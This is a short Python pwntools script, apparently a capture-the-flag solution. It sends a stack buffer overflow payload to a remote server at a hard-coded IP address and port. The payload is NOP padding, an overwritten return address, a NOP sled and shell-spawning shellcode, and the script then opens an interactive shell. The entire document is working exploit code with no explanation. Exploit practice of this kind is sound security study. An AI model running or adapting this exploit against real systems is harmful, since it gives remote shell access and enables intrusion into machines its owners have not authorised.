from pwn import *

context.arch = 'amd64'
context.os = 'linux'

p = remote('139.155.83.108',10004)

payload = b'\x90'*0x208

payload += p64(0x400709)

payload += b'\x90'*0x100

payload += asm(shellcraft.sh())

p.send(payload)

p.interactive()